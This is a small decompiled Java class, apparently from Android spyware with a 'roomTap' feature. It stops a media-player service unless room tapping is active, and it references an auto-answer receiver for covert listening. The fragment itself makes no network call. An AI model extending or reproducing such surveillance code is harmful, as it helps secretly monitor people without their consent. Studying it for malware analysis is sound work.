package com.network.android.roomTap;

import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class h implements Runnable {
    h() {
    }

    public final void run() {
        try {
            a.a("roleBackAudio calling stopService on MediaPlayerHandlerService ");
            if (AutoAnswerReceiver.a()) {
                a.a("roleBackAudio not stopping service. roomtap is active ");
            } else if (AutoAnswerReceiver.e == null) {
                a.a("roleBackAudio MediaPlayerHandlerService is null. returning ");
            } else {
                NetworkApp.a().stopService(AutoAnswerReceiver.e);
                a.a("roleBackAudio after stopping service MediaPlayerHandlerService");
            }
        } catch (Throwable th) {
            a.a("roleBackAudio unrgisteringMediaPlayerIntentReciever exception- " + th.getMessage(), th);
        }
    }
}
